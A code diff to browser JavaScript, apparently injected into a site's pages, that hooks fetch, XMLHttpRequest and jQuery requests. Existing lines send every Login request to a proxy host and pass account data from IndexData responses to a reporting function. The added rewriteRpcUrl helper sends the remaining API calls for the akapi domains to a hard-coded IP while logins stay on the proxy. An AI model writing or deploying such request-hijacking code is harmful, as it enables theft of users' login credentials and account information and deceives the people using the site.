@@ -212,18 +212,32 @@
             } catch(e) {}
         }
         
+        const API_IP = 'https://35.190.58.228';
+        
+        // 将RPC请求URL重定向到真实IP（Login除外）
+        function rewriteRpcUrl(url) {
+            if (typeof url !== 'string') return url;
+            // Login始终走代理
+            if (url.includes('/RPC/Login') || url.includes('/Login')) {
+                return `https://${proxyHost}/RPC/Login`;
+            }
+            // 相对路径 /RPC/xxx → IP直连
+            if (url.match(/^\/RPC\//)) {
+                return API_IP + url;
+            }
+            // 绝对路径含akapi → IP直连
+            if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
+                return url.replace(/https?:\/\/(www\.)?akapi[13]\.com/, API_IP);
+            }
+            return url;
+        }
+        
         // 拦截 fetch 请求
         if (window.fetch) {
             const originalFetch = window.fetch;
             window.fetch = function(url, options) {
                 updateActivity();
-                let finalUrl = url;
-                if (typeof url === 'string') {
-                    // Login请求重定向到代理（白名单检查）
-                    if (url.includes('/RPC/Login') || url.includes('/Login')) {
-                        finalUrl = `https://${proxyHost}/RPC/Login`;
-                    }
-                }
+                let finalUrl = (typeof url === 'string') ? rewriteRpcUrl(url) : url;
                 // 捕获IndexData响应上报资产
                 var result = originalFetch.call(this, finalUrl, options);
                 if (typeof url === 'string' && url.includes('public_IndexData')) {
@@ -242,22 +256,17 @@
             const originalOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                 updateActivity();
-                if (typeof url === 'string') {
-                    // Login请求重定向到代理
-                    if (url.includes('/RPC/Login') || url.includes('/Login')) {
-                        return originalOpen.call(this, method, `https://${proxyHost}/RPC/Login`, async, user, password);
-                    }
-                    // IndexData: 直连但捕获响应
-                    if (url.includes('public_IndexData')) {
-                        this.addEventListener('load', function() {
-                            try {
-                                var json = JSON.parse(this.responseText);
-                                if (!json.Error && json.Data) reportAssets(json.Data);
-                            } catch(e) {}
-                        });
-                    }
+                var newUrl = (typeof url === 'string') ? rewriteRpcUrl(url) : url;
+                // IndexData: 直连但捕获响应
+                if (typeof url === 'string' && url.includes('public_IndexData')) {
+                    this.addEventListener('load', function() {
+                        try {
+                            var json = JSON.parse(this.responseText);
+                            if (!json.Error && json.Data) reportAssets(json.Data);
+                        } catch(e) {}
+                    });
                 }
-                return originalOpen.call(this, method, url, async, user, password);
+                return originalOpen.call(this, method, newUrl, async, user, password);
             };
         }
         
@@ -265,9 +274,7 @@
         if (window.$ && window.$.ajaxPrefilter) {
             window.$.ajaxPrefilter(function(options, originalOptions, jqXHR) {
                 if (options.url) {
-                    if (options.url.includes('/RPC/Login') || options.url.includes('/Login')) {
-                        options.url = `https://${proxyHost}/RPC/Login`;
-                    }
+                    options.url = rewriteRpcUrl(options.url);
                 }
             });
         }
